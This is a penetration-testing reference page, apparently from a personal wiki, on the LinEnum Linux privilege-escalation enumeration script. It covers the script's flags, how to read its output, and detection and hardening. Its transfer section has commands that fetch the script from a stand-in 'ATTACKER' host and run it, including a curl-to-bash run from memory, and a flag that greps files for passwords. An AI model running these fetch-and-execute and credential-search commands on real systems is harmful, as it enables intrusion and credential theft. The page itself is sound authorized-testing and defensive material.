# LinEnum

[rebootuser/LinEnum](https://github.com/rebootuser/LinEnum) — a classic **Linux** bash enumeration script. Lighter and faster than [linPEAS](PEASS.md), no colour output. Unmaintained now, but still a solid second opinion to catch what linPEAS rated low.

**Download:** [raw LinEnum.sh](https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh) · [repo](https://github.com/rebootuser/LinEnum)

> Authorized testing only. Note anything you drop on a target in your engagement `tools.txt`, and confirm findings by hand against [Linux Privilege Escalation](../Linux/Privilege%20Escalation.md).

## Get it onto the target

```bash
# grab it onto your attack box (keep a copy in your tools dir)
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
# attack box: serve it
python3 -m http.server 80
# target (writable dir)
cd /tmp && wget http://ATTACKER/LinEnum.sh && chmod +x LinEnum.sh && ./LinEnum.sh -t
# or run from memory, no file on disk:
curl -sL http://ATTACKER/LinEnum.sh | bash -s -- -t
```

Transfer channels: [netcat](../Shell/netcat.md), [smb](../Protocols/smb.md).

## Run it

```bash
./LinEnum.sh                                        # default (limited) scan, no output file
./LinEnum.sh -t                                     # thorough — do this for a real engagement
./LinEnum.sh -s -k password -r report -e /tmp/ -t   # the full invocation from its docs
```

| Flag | Does |
| --- | --- |
| `-t` | Thorough (lengthy) tests — the one you usually want |
| `-k <keyword>` | Search file contents for a keyword (e.g. `password`) |
| `-r <name>` | Write a report with this name |
| `-e <path>` | Export interesting files to this directory |
| `-s` | Supply the current user's password to test sudo perms (**insecure — it's echoed**) |
| `-h` | Help |

`-t -k password` is the quick win: thorough scan plus a content grep for "password" across readable files.

## Reading the output

LinEnum flags candidates; you confirm them. Scan for the `[+]`/`[-]` markers, then map each lead to a technique in [Linux Privilege Escalation](../Linux/Privilege%20Escalation.md) (SUID/SGID, sudo rules, cron, capabilities, writable files) and [GTFOBins](https://gtfobins.github.io). Reproduce manually before it's a finding. Creds it surfaces → [Password Attacks & Brute Forcing](../Networking/Password%20Attacks%20%26%20Brute%20Forcing.md).

## Defense / detection

- A shell reading the filesystem wholesale — SUID enumeration, `sudo -l`, hundreds of file stats in seconds — from an account that normally doesn't. See [Abnormal User Behavior](../../Defense/SOC2/Abnormal%20User%20Behavior.md) and [Host-based logging on Linux](../../Defense/Logging/Host-based/Linux.md).
- Defending means removing what it finds — [1. Linux Hardening](../../Defense/System%20and%20Services%20Hardening/1.%20Linux%20Hardening.md).

## Related

[folder README](README.md) · [PEASS](PEASS.md) (linPEAS) · [linuxprivchecker](linuxprivchecker.md) · [Linux Privilege Escalation](../Linux/Privilege%20Escalation.md) · [Linux — Enumeration & Privilege Escalation](../Linux/Enumeration%20%26%20Privilege%20Escalation.md)
